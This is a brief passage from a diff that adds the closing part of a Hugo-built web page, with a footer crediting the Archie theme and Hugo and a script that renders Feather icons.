+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
